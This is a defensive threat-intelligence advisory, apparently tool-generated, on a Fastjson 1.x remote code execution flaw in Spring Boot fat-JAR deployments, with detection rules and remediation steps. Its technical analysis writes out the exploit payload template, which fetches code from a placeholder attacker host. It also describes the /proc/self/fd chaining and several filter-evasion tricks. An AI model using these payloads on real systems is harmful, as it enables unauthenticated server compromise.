# Technical Analysis Report: Fastjson 1.x @JSONType Remote Code Execution (CVE-2026-16723)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-27
Version: 1.0

## Executive Summary

CVE-2026-16723 is a critical (CVSS 9.0) remote code execution vulnerability in Alibaba's Fastjson JSON library, versions 1.2.68 through 1.2.83. Disclosed on July 21, 2026 by Kirill Firsov of FearsOff Cybersecurity, the flaw is being actively exploited in the wild with no patched 1.x version available. The vulnerability exploits Fastjson's `@type` type-resolution pathway within Spring Boot fat-JAR deployments: an attacker-controlled `@type` value triggers a class-resource lookup that, through crafted nested JAR URLs, fetches and executes attacker-supplied bytecode. Critically, this works with AutoType **disabled** (the default), requires no authentication, no user interaction, and no pre-existing gadget class on the classpath. Imperva reports attacks primarily targeting US financial services, healthcare, computing, and retail organizations using browser impersonators and Ruby/Go scanning tools.

## Background: Fastjson and Spring Boot Fat-JAR Deployments

Fastjson is Alibaba's widely-used open-source JSON parsing library for Java. The `@type` annotation provides polymorphic deserialization, mapping JSON to specific Java classes at parse time. While prior Fastjson vulnerabilities (e.g., CVE-2022-25845) required AutoType to be enabled or specific gadget classes on the classpath, CVE-2026-16723 bypasses all of these defenses.

Spring Boot "fat-JAR" packaging bundles application code, dependencies, and a custom class loader (`LaunchedURLClassLoader`) into a single executable JAR. This nested JAR structure is central to the exploit: it provides the class-loading mechanism that allows the attacker to redirect resource lookups to externally-hosted bytecode. Standard WAR deployments on Tomcat/Jetty, generic uber-JARs, and non-fat JAR deployments are **not** affected.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-07-21 | Kirill Firsov (@k_firsov, FearsOff) discloses the vulnerability to Alibaba and publishes technical details |
| 2026-07-21 | Alibaba assigns CVE-2026-16723 with CVSS 9.0 |
| 2026-07-22 | Public PoC exploit code appears on GitHub (dinosn/fastjson-jsontype-rce-lab, 0x7eTeam/fastjson-1.2.83-rce) |
| 2026-07-25 | ThreatBook and Imperva report active in-the-wild exploitation targeting US organizations |
| 2026-07-25 | CISA KEV catalog lists exploitation status as "none" (disputed by multiple vendors) |
| 2026-07-27 | No patched 1.x version available; Fastjson2 confirmed unaffected |

## Root Cause: @JSONType Annotation Trust During Type Resolution

The vulnerability exists in `ParserConfig.checkAutoType`, which probes every `@type` value for the `@JSONType` annotation by calling:

```java
getResourceAsStream(typeName.replace('.', '/') + ".class")
```

This resource lookup is the root cause. When the Thread Context Class Loader (TCCL) is Spring Boot's `LaunchedURLClassLoader`, the lookup follows nested JAR paths. An attacker crafts a `@type` value that, after dot-to-slash transformation, constructs a `jar:http://` URL pointing to attacker-controlled bytecode. The `@JSONType` annotation in the fetched class acts as a trust signal, bypassing type restrictions, and the class's static initializer (`<clinit>`) executes before Fastjson even attempts to cast the object to the target type.

## Technical Analysis of the Malicious Payload

### 1. Exploit Delivery (JDK 8 Direct Route)

The primary payload structure is:

```json
{"@type":"jar:http:..<ATTACKER_HOST>:<PORT>.probe!.POC","x":1}
```

The double-dots (`..`) become double-slashes (`//`) after `typeName.replace('.', '/')`, reconstructing a valid `jar:http://` URL:

```
jar:http://<ATTACKER_HOST>:<PORT>/probe!/POC.class
```

The `!` separator is the standard JAR-internal path delimiter. The class `POC.class` inside the fetched JAR contains a `@JSONType` annotation and a malicious `<clinit>` block that executes arbitrary commands via `Runtime.getRuntime().exec()`.

Key observations:
- AutoType does NOT need to be enabled; the `@type` probe occurs before AutoType checks
- The exploit fires during `checkAutoType`, before binding or casting
- The `ClassCastException` that follows is irrelevant -- code already executed
- Integer IP encoding (e.g., `2130706433` for `127[.]0[.]0[.]1`) is used to bypass dot-based filtering

### 2. Modern JDK 17+ Route (Retained-JAR FD Chain)

On JDK 9+, the direct crafted-name class definition is blocked. The modern route exploits Linux procfs:

1. A "seed" `@type` with `jar:http://` fetches the attacker JAR, which gets cached in an open file descriptor
2. Subsequent `@type` values reference `jar:file:/proc/self/fd/N` to reopen the cached JAR
3. This bypasses the JDK 9+ restriction by using a `file:` protocol through procfs

This variant requires Linux (for `/proc/self/fd/` or `/dev/fd/`), and the seed and FD candidates can be carried in a single HTTP request body within a fixed DTO containing `List<Object>` generics.

### 3. Attacker Infrastructure

Observed attack characteristics:
- Browser impersonators (primary User-Agent pattern) constitute the majority of scanning traffic
- Approximately 30% Ruby/Go-based scanning tools
- Targets: US-based financial services, healthcare, computing, and retail organizations
- Secondary targeting: Singapore and Canada

### 4. Post-Exploitation Behavior

Successful exploitation grants code execution with the privileges of the Java process. Observed post-exploitation activities include:
- Shell command execution via `Runtime.exec()` (static initializer)
- File creation (e.g., `/tmp/PWNED` in PoC)
- Webshell deployment
- Reverse shell establishment
- Unexpected outbound connections from Java processes

### 5. Evasion Techniques

- **Integer IP encoding**: Using decimal integer representation of IP addresses (e.g., `2130706433` for `127[.]0[.]0[.]1`) to evade dot-based filters
- **Unicode escaping**: `\uXXXX`-encoding the `@type` key or class value, which Fastjson still decodes
- **Dot transformation**: The `..` to `//` transformation inherent in the exploit obfuscates the URL structure in the raw payload
- **Fixed-DTO wrapping**: Nesting the payload inside a legitimate-looking DTO structure with `List<Object>` fields

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1[.]2[.]3[.]4`)

### Package / Software Level

| Package / Component | Vulnerable Versions | Description |
|---------------------|---------------------|-------------|
| `com.alibaba:fastjson` | 1.2.68 - 1.2.83 | Vulnerable to @JSONType RCE via jar:http class loading |
| `com.alibaba:fastjson:1.2.83_noneautotype` | N/A | Mitigated build (safe) |
| `com.alibaba:fastjson2` | All | Not affected (separate codebase) |

### Behavioral

- HTTP POST requests to any endpoint with JSON body containing `@type` alongside `jar:http` patterns
- HTTP POST requests with JSON body containing `@type` alongside `/proc/self/fd/` or `/dev/fd/` references
- Java processes (`java`) spawning command interpreters (`/bin/sh`, `/bin/bash`) with suspicious arguments
- Java processes initiating unexpected outbound HTTP connections to non-standard ports (JAR fetch callback)
- File creation in `/tmp/` by Java processes
- Webshell artifacts in web-accessible directories created by Java processes
- Integer-encoded IP addresses in HTTP request bodies alongside `@type` JSON keys

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Unauthenticated RCE via crafted JSON POST to Spring Boot endpoints |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Post-exploitation shell command execution via `Runtime.exec()` in malicious `<clinit>` |
| T1071.001 | Application Layer Protocol: Web Protocols | JAR fetch over HTTP during exploitation; browser-impersonation User-Agents |
| T1105 | Ingress Tool Transfer | Attacker-controlled JAR fetched by victim's JVM during type resolution |
| T1505.003 | Server Software Component: Web Shell | Post-exploitation webshell deployment reported by Imperva |

## Impact Assessment

**Breadth**: Any organization running Fastjson 1.2.68-1.2.83 in Spring Boot fat-JAR deployments with SafeMode disabled (the default) is vulnerable. Fastjson is one of the most widely-used JSON libraries in the Java ecosystem, particularly in Chinese and international enterprises. Maven Central download statistics indicate millions of monthly downloads.

**Depth**: The vulnerability provides unauthenticated RCE with the privileges of the Java process, typically running as a service account. This enables full server compromise, data exfiltration, lateral movement, and persistence.

**Stealth**: The exploit payload is compact (a single-line JSON body) and can be delivered to any endpoint that processes JSON input. The `ClassCastException` that follows exploitation may not be logged or may be indistinguishable from normal application errors.

**Active Exploitation**: Confirmed by ThreatBook and Imperva as of July 25, 2026, primarily targeting US-based organizations across financial services, healthcare, computing, and retail sectors.

## Detection & Remediation

### Immediate Detection

Check if your environment is vulnerable:

```bash
# Scan for vulnerable Fastjson + Spring Boot loader combinations
# Using the scanner from the PoC lab
python3 fjscan_static.py /path/to/deployed/jars --threads 16

# Search for Fastjson 1.2.68-1.2.83 in Maven dependencies
grep -r 'fastjson' */pom.xml */build.gradle | grep -E '1\.2\.(6[89]|7[0-9]|8[0-3])'

# Check application logs for @type exploitation attempts
grep -rE '"@type"\s*:\s*"jar:' /var/log/app/*.log

# Check for /proc/self/fd exploitation attempts
grep -rE '"@type".*proc/self/fd' /var/log/app/*.log
```

### Remediation

1. **IMMEDIATE**: Enable SafeMode on all Fastjson 1.x deployments:
   ```
   -Dfastjson.parser.safeMode=true
   ```

2. **IMMEDIATE ALTERNATIVE**: If SafeMode breaks legitimate parsing, switch to the restricted build:
   ```xml
   <dependency>
       <groupId>com.alibaba</groupId>
       <artifactId>fastjson</artifactId>
       <version>1.2.83_noneautotype</version>
   </dependency>
   ```

3. **SHORT-TERM**: Block `@type` patterns in WAF rules for inbound JSON traffic

4. **SHORT-TERM**: Restrict JVM egress at the network level to prevent JAR fetch callbacks

5. **LONG-TERM**: Migrate to Fastjson2 (separate, unaffected codebase)

6. **FORENSIC**: Audit all Java process activity for suspicious child process creation and unexpected outbound connections since July 21, 2026

### Long-Term Hardening

- Implement network egress controls for all Java application servers
- Deploy WAF rules that inspect JSON request bodies for deserialization attack patterns
- Adopt a dependency management policy that tracks Fastjson usage across the organization
- Consider migrating all JSON parsing to Jackson or Gson where Fastjson-specific features are not required
- Implement runtime application self-protection (RASP) that can detect and block deserialization attacks

## Detection Rules

These rules target the two primary exploitation routes of CVE-2026-16723: the JDK 8 direct `jar:http` class loading path and the JDK 17+ `/proc/self/fd` retained-JAR path. Network IDS rules match the distinctive payload patterns in HTTP request bodies; file-scanning rules detect exploit payloads and malicious probe JARs at rest. All network rules require HTTP body inspection to be enabled. The primary false positive risk is legitimate JSON containing `@type` keys in non-Fastjson contexts, which is mitigated by requiring co-occurrence with `jar:http` or `/proc/self/fd` patterns.

<!-- dropped: Sigma "Suspicious Shell Spawned by Java Process" and "Java Process Outbound Connection to Non-Standard Port" -- altitude violations; behavioral TTP rules not artifact-specific to CVE-2026-16723, unacceptable FP surface on generic Java workloads -->

### Suricata: Fastjson @type jar:http RCE Payload (JDK 8 Route)

Detects the JDK 8 direct-class exploitation payload containing `@type` with `jar:http` and the `.probe!.` JAR-internal path separator in HTTP request bodies.
<!-- audit: compile=suricata-7.0.3-pass; protocol=http with http.request_body buffer (dot-notation); content ordering: @type fast_pattern then jar:http then .probe!.; all values real (not defanged); sid=9900001 in custom range (moved from 2100101 to avoid ET allocation collision) -->
compile: pass (suricata -T) | confidence: high

```
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - Fastjson @type jar:http RCE Payload in HTTP Request Body (CVE-2026-16723)"; flow:established,to_server; http.request_body; content:"@type"; fast_pattern; content:"jar:http"; content:".probe!."; classtype:web-application-attack; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; reference:cve,2026-16723; metadata:author Actioner, created_at 2026-07-27, cve CVE-2026-16723; sid:9900001; rev:1;)
```

Caveat: Requires Suricata HTTP body inspection enabled; the `.probe!.` content narrows to the specific PoC pattern and may need broadening as exploit variants emerge.

### Suricata: Fastjson @type /proc/self/fd RCE Payload (JDK 17+ Route)

Detects the modern JDK 17+ exploitation payload containing `@type` with `/proc/self/fd/` references in HTTP request bodies, indicating the retained-JAR file-descriptor chain.
<!-- audit: compile=suricata-7.0.3-pass; protocol=http with http.request_body buffer; content ordering: @type fast_pattern then /proc/self/fd/; all values real; sid=9900002 (moved from 2100102) -->
compile: pass (suricata -T) | confidence: high

```
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - Fastjson @type /proc/self/fd RCE Payload in HTTP Request Body (CVE-2026-16723)"; flow:established,to_server; http.request_body; content:"@type"; fast_pattern; content:"/proc/self/fd/"; classtype:web-application-attack; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; reference:cve,2026-16723; metadata:author Actioner, created_at 2026-07-27, cve CVE-2026-16723; sid:9900002; rev:1;)
```

### Suricata: Fastjson @type /dev/fd RCE Payload (Alternative FD Path)

Detects an alternative file-descriptor path using `/dev/fd/` instead of `/proc/self/fd/` for the retained-JAR chain on systems where `/dev/fd` is a symlink to procfs.
<!-- audit: compile=suricata-7.0.3-pass; protocol=http with http.request_body buffer; content ordering: @type fast_pattern then /dev/fd/; all values real; sid=9900003 (moved from 2100103) -->
compile: pass (suricata -T) | confidence: high

```
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - Fastjson @type /dev/fd RCE Payload in HTTP Request Body (CVE-2026-16723)"; flow:established,to_server; http.request_body; content:"@type"; fast_pattern; content:"/dev/fd/"; classtype:web-application-attack; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; reference:cve,2026-16723; metadata:author Actioner, created_at 2026-07-27, cve CVE-2026-16723; sid:9900003; rev:1;)
```

### Snort: Fastjson @type jar:http RCE Payload (JDK 8 Route, Broad Match)

Detects the JDK 8 direct-class exploitation payload in HTTP request bodies, matching `@type` with `jar:http` using Snort 2.9 syntax (without `.probe!.` narrowing, covering variant JAR entry names).
<!-- audit: compile=snort-2.9.20-pass (snort -c min.conf -T); protocol=tcp to $HTTP_PORTS with http_client_body modifier (Snort 2 syntax); content: @type fast_pattern + jar:http (hex-encoded colon |3a|); classtype: web-application-attack; sid=9900001 (moved from 2100101); note: intentionally omits .probe!. match unlike Suricata counterpart for broader variant coverage -->
compile: pass (snort -T) | confidence: high

```
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - Fastjson @type jar:http RCE Payload in HTTP Request Body - Broad Match (CVE-2026-16723)"; flow:established,to_server; content:"@type"; http_client_body; fast_pattern; content:"jar|3a|http"; http_client_body; classtype:web-application-attack; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; reference:cve,2026-16723; metadata:author Actioner, created 2026-07-27; sid:9900001; rev:1;)
```

### Snort: Fastjson @type /proc/self/fd RCE Payload (JDK 17+ Route)

Detects the modern JDK 17+ exploitation payload containing `/proc/self/fd/` references in HTTP request bodies, targeting the retained-JAR file-descriptor chain.
<!-- audit: compile=snort-2.9.20-pass (snort -c min.conf -T); protocol=tcp to $HTTP_PORTS with http_client_body modifier; content: @type fast_pattern + /proc/self/fd/; sid=9900002 (moved from 2100102) -->
compile: pass (snort -T) | confidence: high

```
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - Fastjson @type /proc/self/fd RCE Payload in HTTP Request Body (CVE-2026-16723)"; flow:established,to_server; content:"@type"; http_client_body; fast_pattern; content:"/proc/self/fd/"; http_client_body; classtype:web-application-attack; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; reference:cve,2026-16723; metadata:author Actioner, created 2026-07-27; sid:9900002; rev:1;)
```

### YARA: Fastjson @JSONType jar:http Exploit Payload

Detects Fastjson CVE-2026-16723 exploit payloads in network captures, log files, or HTTP request bodies by matching the distinctive combination of `@type` JSON keys with `jar:http` remote-JAR patterns and `/proc/self/fd` file-descriptor chain references.
<!-- audit: compile=yarac-pass (exit 0); strings: all ascii with nocase where appropriate; condition: requires @type key AND at least one exploitation pattern (jar:http+probe!, dot-dot pattern, or procfs/devfs FD reference); no PE/ELF header constraint (payload is JSON, not executable); no filesize constraint -->
compile: pass (yarac) | confidence: high

```yara
rule Exploit_CVE_2026_16723_Fastjson_JSONType_RCE
{
    meta:
        description = "Detects Fastjson @JSONType jar:http RCE exploit payloads (CVE-2026-16723) in network captures, log files, or request bodies"
        author = "Actioner"
        date = "2026-07-27"
        reference = "https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $type_key = "\"@type\"" ascii nocase
        $jar_http = "jar:http" ascii nocase
        $jar_file_proc = "jar:file:/proc/self/fd/" ascii nocase
        $jar_file_dev = "jar:file:/dev/fd/" ascii nocase
        $probe_bang = ".probe!." ascii
        $proc_fd = "/proc/self/fd/" ascii
        $dev_fd = "/dev/fd/" ascii
        $dot_dot_pattern = "jar:http:.." ascii

    condition:
        $type_key and (
            ($jar_http and $probe_bang) or
            $dot_dot_pattern or
            ($jar_http and ($proc_fd or $dev_fd)) or
            $jar_file_proc or
            $jar_file_dev
        )
}
```

### YARA: Fastjson Malicious Probe JAR Artifact

Detects the malicious probe JAR artifact generated by CVE-2026-16723 exploit tooling, containing `@JSONType` annotated classes with static initializers that execute commands.
<!-- audit: compile=yarac-pass (exit 0); strings: ZIP/JAR header at offset 0, @JSONType annotation path, clinit method, Runtime.exec chain, POC.class entry; condition: requires JAR header + annotation + clinit + exec chain + POC.class + size < 50KB; filesize constraint appropriate for probe JARs; confidence downgraded to medium: POC.class name is specific to public PoC tooling and trivially evaded by renaming -->
compile: pass (yarac) | confidence: medium

```yara
rule Exploit_CVE_2026_16723_Fastjson_Probe_JAR
{
    meta:
        description = "Detects the malicious probe JAR artifact generated by Fastjson CVE-2026-16723 exploit tooling containing @JSONType annotated classes"
        author = "Actioner"
        date = "2026-07-27"
        reference = "https://github.com/dinosn/fastjson-jsontype-rce-lab"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $pk_header = { 50 4B 03 04 }
        $json_type_annotation = "com/alibaba/fastjson/annotation/JSONType" ascii
        $clinit = "<clinit>" ascii
        $runtime_exec = "Runtime" ascii
        $exec_method = "exec" ascii
        $probe_class = "POC.class" ascii

    condition:
        $pk_header at 0 and
        $json_type_annotation and
        $clinit and
        ($runtime_exec and $exec_method) and
        $probe_class and
        filesize < 50KB
}
```

Caveat: The `POC.class` entry name is specific to the public PoC tooling; sophisticated attackers may use different class names.

## Lessons Learned

1. **AutoType OFF is not a mitigation**: This vulnerability fundamentally challenges the assumption that disabling AutoType protects Fastjson deployments. The `@type` probe in `checkAutoType` executes resource lookups regardless of AutoType settings, making the mere presence of Fastjson 1.x in a Spring Boot fat-JAR a risk.

2. **DTO binding is not a mitigation**: The exploit fires during the `@type` probe, before Fastjson attempts to cast the result to the target class. Using fixed DTOs like `JSON.parseObject(body, Dto.class)` does not prevent exploitation, especially when the DTO contains generic fields like `List<Object>`.

3. **Nested classloader architectures expand attack surface**: Spring Boot's `LaunchedURLClassLoader` turns a type-resolution lookup into a network fetch. Any framework that nests class loaders should be scrutinized for similar resource-resolution vulnerabilities.

4. **Linux procfs as an exploitation primitive**: The JDK 17+ route demonstrates that `/proc/self/fd/` can be weaponized to reopen cached resources, bypassing runtime restrictions. This pattern may apply to other vulnerability classes.

5. **Vendor vs. CISA disconnect**: The documented discrepancy between vendor-confirmed active exploitation (ThreatBook, Imperva) and CISA KEV listing exploitation as "none" highlights the need for multi-source threat intelligence.

## Sources

<!-- Every source MUST be a markdown link [Name](URL). A source without a URL is a bug. -->

- [The Hacker News - Fastjson 1.x RCE Vulnerability](https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html) -- primary reporting on CVE-2026-16723 disclosure, timeline, and exploitation status
- [Imperva Blog - CVE-2026-16723 Protection](https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-16723-critical-fastjson-1-x-zero-day-rce/) -- attack telemetry, industry targeting, attacker tooling patterns, and WAF detection guidance
- [dinosn/fastjson-jsontype-rce-lab (GitHub)](https://github.com/dinosn/fastjson-jsontype-rce-lab) -- comprehensive PoC lab with JDK 8 and JDK 17 exploitation routes, scanner tools, and technical mechanism documentation
- [0x7eTeam/fastjson-1.2.83-rce (GitHub)](https://github.com/0x7eTeam/fastjson-1.2.83-rce) -- alternative PoC with GenProbe.java payload generator and exploitation chain documentation
- [SecurityOnline - Public PoC Released](https://securityonline.info/fastjson-rce-1-2-83/) -- public PoC release reporting and exploitation prerequisites
- [LatestHackingNews - How the Vulnerability Works](https://latesthackingnews.com/2026/07/26/fastjson-rce-vulnerability-how-to-check/) -- technical walkthrough of the exploitation mechanism and exposure checking guidance
- [Security Boulevard - Imperva CVE-2026-16723](https://securityboulevard.com/2026/07/imperva-customers-protected-against-cve-2026-16723-critical-fastjson-1-x-zero-day-rce/) -- syndicated Imperva analysis with additional attack context
- [FearsOff Research - Fastjson 1.2.83 RCE](https://fearsoff.org/research/fastjson-1-2-83-rce) -- original disclosure by Kirill Firsov with technical details (referenced by PoC repos)

<!-- revision: v1.0 2026-07-27 -- dropped 2 Sigma rules (altitude violations, generic TTP); downgraded YARA Probe JAR confidence high->medium (POC.class name trivially evaded); defanged 127.0.0.1 in Technical Analysis; moved SIDs 2100101-2100103 to 9900001-9900003 (ET range collision); differentiated Snort JDK8 title (omits .probe!. match); trimmed detection intro (removed endpoint rule references) -->

---
*Report generated by Actioner*
